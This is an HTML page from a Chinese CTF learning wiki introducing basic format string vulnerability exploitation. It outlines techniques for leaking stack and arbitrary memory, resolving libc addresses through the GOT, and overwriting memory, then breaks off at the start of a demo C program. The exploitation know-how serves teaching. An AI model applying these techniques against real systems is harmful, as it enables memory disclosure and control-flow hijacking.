@@ -1,0 +1,1543 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="SkYe Wiki">
+      
+      
+      
+        <meta name="author" content="SkYe231">
+      
+      
+        <link rel="canonical" href="https://wiki.mrskye.cn/Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/">
+      
+      <link rel="shortcut icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.2.4">
+    
+    
+      
+        <title>格式化字符串漏洞基础利用 - SkYe Wiki</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.15aa0b43.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.75751829.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#ffffff">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans:300,400,400i,700%7CSource+Code+Pro&display=fallback">
+        <style>body,input{font-family:"Noto Sans",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Source Code Pro",SFMono-Regular,Consolas,Menlo,monospace}</style>
+      
+    
+    
+    
+    
+      
+        
+<script>window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-36723568-3","wiki.mrskye.cn"),ga("set","anonymizeIp",!0),ga("send","pageview"),document.addEventListener("DOMContentLoaded",function(){document.forms.search&&document.forms.search.query.addEventListener("blur",function(){if(this.value){var e=document.location.pathname;ga("send","pageview",e+"?q="+this.value)}})}),document.addEventListener("DOMContentSwitch",function(){ga("send","pageview",document.location.pathname)})</script>
+<script async src="https://www.google-analytics.com/analytics.js"></script>
+      
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="white" data-md-color-accent="green">
+      
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#_1" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid" aria-label="Header">
+    <a href="https://wiki.mrskye.cn/" title="SkYe Wiki" class="md-header-nav__button md-logo" aria-label="SkYe Wiki">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 22a2 2 0 002-2V4a2 2 0 00-2-2h-6v7L9.5 7.5 7 9V2H6a2 2 0 00-2 2v16a2 2 0 002 2h12z"/></svg>
+
+    </a>
+    <label class="md-header-nav__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header-nav__title" data-md-component="header-title">
+      <div class="md-header-nav__ellipsis">
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            SkYe Wiki
+          </span>
+        </div>
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            
+              格式化字符串漏洞基础利用
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <label class="md-header-nav__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header-nav__source">
+        
+<a href="https://github.com/skyedai910/wiki.mrskye.cn/" title="前往 GitHub 仓库" class="md-source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    skyedai910/wiki.mrskye.cn
+  </div>
+</a>
+      </div>
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="https://wiki.mrskye.cn/" title="SkYe Wiki" class="md-nav__button md-logo" aria-label="SkYe Wiki">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 22a2 2 0 002-2V4a2 2 0 00-2-2h-6v7L9.5 7.5 7 9V2H6a2 2 0 00-2 2v16a2 2 0 002 2h12z"/></svg>
+
+    </a>
+    SkYe Wiki
+  </label>
+  
+    <div class="md-nav__source">
+      
+<a href="https://github.com/skyedai910/wiki.mrskye.cn/" title="前往 GitHub 仓库" class="md-source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    skyedai910/wiki.mrskye.cn
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  
+
+
+  
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1" checked>
+    
+    <label class="md-nav__link" for="nav-1">
+      Pwn
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Pwn" data-md-level="1">
+      <label class="md-nav__title" for="nav-1">
+        <span class="md-nav__icon md-icon"></span>
+        Pwn
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1-1" type="checkbox" id="nav-1-1" >
+    
+    <label class="md-nav__link" for="nav-1-1">
+      IO_FILE
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="IO_FILE" data-md-level="2">
+      <label class="md-nav__title" for="nav-1-1">
+        <span class="md-nav__icon md-icon"></span>
+        IO_FILE
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../IO_FILE/glibc2.24%E4%B8%8BIO_FILE%E7%9A%84%E5%88%A9%E7%94%A8/" class="md-nav__link">
+      libc2.24下IO_FILE的利用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../IO_FILE/Pwn_IO_FILE/" class="md-nav__link">
+      Pwn_IO_FILE
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1-2" type="checkbox" id="nav-1-2" >
+    
+    <label class="md-nav__link" for="nav-1-2">
+      Heap
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Heap" data-md-level="2">
+      <label class="md-nav__title" for="nav-1-2">
+        <span class="md-nav__icon md-icon"></span>
+        Heap
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="md-nav__link">
+      堆基础知识
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/off_by_one/" class="md-nav__link">
+      off_by_one
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/fastbin/" class="md-nav__link">
+      fastbin attack
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/" class="md-nav__link">
+      堆重叠&拓展
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/use_after_free/" class="md-nav__link">
+      UAF
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/unlink/" class="md-nav__link">
+      Unlink
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/realloc/" class="md-nav__link">
+      realloc
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/unsorted_bin_attack/" class="md-nav__link">
+      unsorted_bin_attack
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/Libc2.29%E7%B1%BBunlink_attack/" class="md-nav__link">
+      libc2.29类unlink_attack
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/%E6%B2%99%E7%9B%92%E5%A0%86%E6%BA%A2%E5%87%BA/" class="md-nav__link">
+      沙盒堆溢出
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1-2-11" type="checkbox" id="nav-1-2-11" >
+    
+    <label class="md-nav__link" for="nav-1-2-11">
+      House技术
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="House技术" data-md-level="3">
+      <label class="md-nav__title" for="nav-1-2-11">
+        <span class="md-nav__icon md-icon"></span>
+        House技术
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/House/House_Of_Force/House_Of_Force/" class="md-nav__link">
+      House_Of_Force
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/House/House_of_Lore/House_of_Lore/" class="md-nav__link">
+      House_of_Lore
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  
+
+
+  
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1-3" type="checkbox" id="nav-1-3" checked>
+    
+    <label class="md-nav__link" for="nav-1-3">
+      格式化字符串
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="格式化字符串" data-md-level="2">
+      <label class="md-nav__title" for="nav-1-3">
+        <span class="md-nav__icon md-icon"></span>
+        格式化字符串
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/" class="md-nav__link">
+      格式化字符串漏洞基础例子
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        格式化字符串漏洞基础利用
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+    
+    <a href="./" class="md-nav__link md-nav__link--active">
+      格式化字符串漏洞基础利用
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    泄露内存
+  </a>
+  
+    <nav class="md-nav" aria-label="泄露内存">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    简单的泄露栈内存
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    泄露任意地址内存
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    小总结
+  </a>
+  
+    <nav class="md-nav" aria-label="小总结">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    会用来泄露什么
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    关键字选择
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    覆盖内存
+  </a>
+  
+    <nav class="md-nav" aria-label="覆盖内存">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    覆盖任意地址
+  </a>
+  
+    <nav class="md-nav" aria-label="覆盖任意地址">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    覆盖小数字
+  </a>
+  
+    <nav class="md-nav" aria-label="覆盖小数字">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    怎么对齐
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    覆盖大数字
+  </a>
+  
+    <nav class="md-nav" aria-label="覆盖大数字">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#c" class="md-nav__link">
+    手工计算 c 生成字符数
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    覆盖栈内存
+  </a>
+  
+    <nav class="md-nav" aria-label="覆盖栈内存">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    确定覆盖地址
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    确定相对偏移
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    进行覆盖
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/" class="md-nav__link">
+      格式化字符串盲打
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" >
+    
+    <label class="md-nav__link" for="nav-2">
+      Stack
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Stack" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        <span class="md-nav__icon md-icon"></span>
+        Stack
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-1" type="checkbox" id="nav-2-1" >
+    
+    <label class="md-nav__link" for="nav-2-1">
+      ROP
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="ROP" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-1">
+        <span class="md-nav__icon md-icon"></span>
+        ROP
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="md-nav__link">
+      蒸米ROP笔记
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/" class="md-nav__link">
+      花式栈溢出技巧
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/SROP/srop/" class="md-nav__link">
+      SROP
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/Canary/" class="md-nav__link">
+      Canary
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/%E6%A0%88%E8%BF%81%E7%A7%BB/%E6%A0%88%E8%BF%81%E7%A7%BB/" class="md-nav__link">
+      栈迁移
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/" class="md-nav__link">
+      fini_array劫持
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3" >
+    
+    <label class="md-nav__link" for="nav-3">
+      Misc
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Misc" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        <span class="md-nav__icon md-icon"></span>
+        Misc
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../Misc/%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84/" class="md-nav__link">
+      文件的结构
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../Misc/ZIP%E5%8E%8B%E7%BC%A9%E5%8C%85%E4%BC%AA%E5%8A%A0%E5%AF%86/" class="md-nav__link">
+      ZIP压缩包伪加密
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../Misc/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81-volatility/" class="md-nav__link">
+      内存取证-volatility
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4" >
+    
+    <label class="md-nav__link" for="nav-4">
+      Crypto
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Crypto" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        <span class="md-nav__icon md-icon"></span>
+        Crypto
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../Crypto/CTF%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%ADpython%E5%BA%93%E5%BA%94%E7%94%A8/" class="md-nav__link">
+      CTF密码学中python库应用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../Crypto/yafu%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/" class="md-nav__link">
+      yafu安装及使用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../Crypto/RSA%E5%8A%A0%E5%AF%86%E7%AC%94%E8%AE%B0/" class="md-nav__link">
+      RSA加密笔记
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    泄露内存
+  </a>
+  
+    <nav class="md-nav" aria-label="泄露内存">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    简单的泄露栈内存
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    泄露任意地址内存
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    小总结
+  </a>
+  
+    <nav class="md-nav" aria-label="小总结">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    会用来泄露什么
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    关键字选择
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    覆盖内存
+  </a>
+  
+    <nav class="md-nav" aria-label="覆盖内存">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    覆盖任意地址
+  </a>
+  
+    <nav class="md-nav" aria-label="覆盖任意地址">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    覆盖小数字
+  </a>
+  
+    <nav class="md-nav" aria-label="覆盖小数字">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    怎么对齐
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    覆盖大数字
+  </a>
+  
+    <nav class="md-nav" aria-label="覆盖大数字">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#c" class="md-nav__link">
+    手工计算 c 生成字符数
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    覆盖栈内存
+  </a>
+  
+    <nav class="md-nav" aria-label="覆盖栈内存">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    确定覆盖地址
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    确定相对偏移
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    进行覆盖
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/skyedai910/wiki.mrskye.cn/blob/master/docs/Pwn/fmtstr/格式化字符串漏洞基础利用.md" title="编辑此页" class="md-content__button md-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
+                  </a>
+                
+                
+                <h1 id="_1">格式化字符串漏洞基础利用<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<blockquote>
+<p>阅读 ctf-wiki 后总结</p>
+</blockquote>
+<h2 id="_2">泄露内存<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>利用格式化字符串漏洞，我们还可以获取我们所想要输出的内容。一般会有如下几种操作</p>
+<ul>
+<li>泄露栈内存</li>
+<li>获取某个变量的值</li>
+<li>获取某个变量对应地址的内存</li>
+<li>泄露任意地址内存</li>
+<li>利用 GOT 表得到 libc 函数地址，进而获取 libc，进而获取其它 libc 函数地址</li>
+<li>盲打，dump 整个程序，获取有用信息。</li>
+</ul>
+<h3 id="_3">简单的泄露栈内存<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<p>例如，给定如下程序</p>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp"># file:leakmemory.c</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
